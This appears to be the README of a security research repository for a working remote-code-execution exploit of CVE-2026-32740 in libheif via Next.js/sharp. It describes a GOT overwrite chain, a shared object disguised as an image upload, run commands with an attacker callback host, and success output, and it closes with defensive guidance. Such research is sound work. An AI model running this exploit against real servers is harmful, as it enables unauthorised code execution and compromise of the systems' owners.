# libheif grid-to-GOT Next.js RCE

Working remote proof of concept that turns CVE-2026-32740 in the
version-pinned Next.js/sharp image stack into a chosen-address write and a
native-code callback.

This is a private Fortbridge research repository. Use it only against the
included lab or another system you are explicitly authorised to test.

## What the PoC proves

The exploit uses only the target's HTTP upload and image-optimization routes:

1. It uploads a callback shared object under the image-looking name `x.jpg`.
2. It repeatedly submits a donor AVIF until pixels returned by the optimizer
   disclose one unambiguous three-pointer libvips signature.
3. It derives the randomized libvips base from those returned pixels.
4. It generates a 116x33 four-tile AVIF whose Cb overflow redirects the Cr
   plane to `memcpy@GOT - 16`.
5. The first chosen-address row replaces `memcpy@GOT` with Node's fixed
   `unixDlOpen`; the next row supplies `uploads/x.jpg` in RSI.
6. Loading the staged shared object runs the fixed command `/usr/bin/id` and
   returns its output over TCP. An internal per-attempt identifier prevents a
   stale or unrelated callback from being counted as success; it is not the
   command-execution proof.

The final validation cohort succeeded in 10/10 fresh processes with ten
different ASLR bases. See
[`evidence/http-got-memcpy-rce-10x.json`](evidence/http-got-memcpy-rce-10x.json).

## Tested stack

- Node.js 25.8.1, non-PIE `ET_EXEC`
- Next.js 15.5.23
- sharp 0.34.4
- bundled libvips 8.17.2
- bundled libheif 1.20.2
- Linux x86-64 with ASLR and NX enabled

The Node helper address, libvips relocation offset and partial-pointer layout
are build-specific. This repository deliberately fails closed when the remote
pixel leak does not produce exactly one complete three-pointer signature.

## Requirements

- Linux x86-64
- Python 3.11 or later
- `ffmpeg` with the `libaom-av1` encoder
- a C compiler available as `cc`
- an IPv4 callback address reachable from the target
- Node.js 25.8.1 and npm to run the included lab

Install the only Python dependency:

```bash
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install -r requirements.txt
```

Confirm AV1 encoding support:

```bash
ffmpeg -hide_banner -encoders | grep libaom-av1
```

## Start the included lab

The lab intentionally accepts arbitrary uploads and passes selected files to
sharp. Do not expose it to an untrusted network.

```bash
cd lab
npm ci
npm run build
npm run start
```

The target is then available at `http://127.0.0.1:3000`.

Do not add `LD_PRELOAD`, `MALLOC_ARENA_MAX`, `GLIBC_TUNABLES`,
`VIPS_CONCURRENCY` or `UV_THREADPOOL_SIZE`. The published result uses the
stock process environment and normal sharp worker scheduling.

## Run the exploit

For a local lab, use loopback for both the target and callback:

```bash
python3 exploit.py \
  --target http://127.0.0.1:3000 \
  --callback-host 127.0.0.1 \
  --json-output result.json
```

For an authorised remote target, `--callback-host` must be an attacker IPv4
address that the target can reach. The listener binds to all local interfaces
by default:

```bash
python3 exploit.py \
  --target https://authorised-target.example \
  --callback-host 203.0.113.10 \
  --callback-port 33333 \
  --json-output result.json
```

A successful result contains:

```json
{
  "success": true,
  "callback": {
    "token_matched": true,
    "proof_command": "/usr/bin/id",
    "command_output": "uid=1000(research) gid=1000(research) groups=1000(research)"
  }
}
```

The terminal also prints the result directly:

```text
[RCE] /usr/bin/id -> uid=1000(research) gid=1000(research) groups=1000(research)
```

The optimizer request will usually end with a connection drop and the target
process will normally terminate after the callback. Those events are recorded
for context but are not success conditions.

## Command-line options

```text
--target URL              Target base URL (required)
--callback-host IPV4      Address embedded in the uploaded library (required)
--callback-port PORT      Callback and listener port (default: 33333)
--listen-host IPV4        Local bind address (default: 0.0.0.0)
--leak-attempts N         Maximum donor requests (default: 16)
--callback-timeout SEC    Listener timeout (default: 12)
--trigger-timeout SEC     Optimizer request timeout (default: 20)
--library-name NAME       Staged filename (default: x.jpg)
--remote-upload-dir DIR   Target-relative upload directory (default: uploads)
--json-output FILE        Save the complete result
--concise                 Omit the full JSON result from the terminal
```

The complete target-relative library path, including its terminating NUL,
must fit in 16 bytes. The default `uploads/x.jpg` satisfies that constraint.

## Repository layout

```text
exploit.py                         remote orchestrator and callback verifier
rce_payload.py                     proven memcpy-GOT AVIF payload
avif_grid.py                       lossless AV1 grid/ISO-BMFF generator
callback/callback.c                fixed /usr/bin/id constructor proof
payloads/leak-crop-donor-*.avif    returned-pixel information disclosure
lab/                               version-pinned Next.js target
evidence/                          debugger-free validation results
```

`rce_payload.py` contains only the final demonstrated chain. Abandoned BSS,
vtable and rb-tree-GOT experiments were intentionally excluded.

## Scope and limitations

- The target needs an upload path that preserves an attacker-chosen file in a
  location reachable by `dlopen`, plus a sharp optimization path for AVIF.
- The included lab accepts an ELF shared object named `x.jpg`. Strong magic
  validation, generated storage names, or an upload directory outside the
  application working directory can break the staging step.
- The fixed Node and libvips offsets apply only to the tested binaries.
- The low-16-bit plane-map redirection depends on the measured pinned sharp
  worker layout.
- The PoC proves native execution by returning `/usr/bin/id` output; it does
  not provide an arbitrary command interface or attempt to keep the corrupted
  target process alive.

## Defensive guidance

- Upgrade to a libheif release containing the CVE-2026-32740 fix and rebuild
  every dependent sharp/libvips component.
- Reject or isolate AVIF/HEIF processing until the deployed native dependency
  chain has been verified.
- Validate upload magic, generate server-side names and store uploads outside
  the application working directory on a `noexec` mount.
- Run image decoding in a disposable, least-privileged worker without secrets
  or unrestricted outbound network access.
- Monitor native image workers for crashes and unexpected `dlopen` or file
  access against upload directories.

## Reproducibility rules

The final evidence was produced without `LD_PRELOAD`, `/proc` address reads,
debugger-derived runtime values, disabled ASLR, allocator tuning, worker-count
changes or target configuration changes. Passive debugging was used during
development only to label fixed binary offsets and was not part of the
delivered exploit.
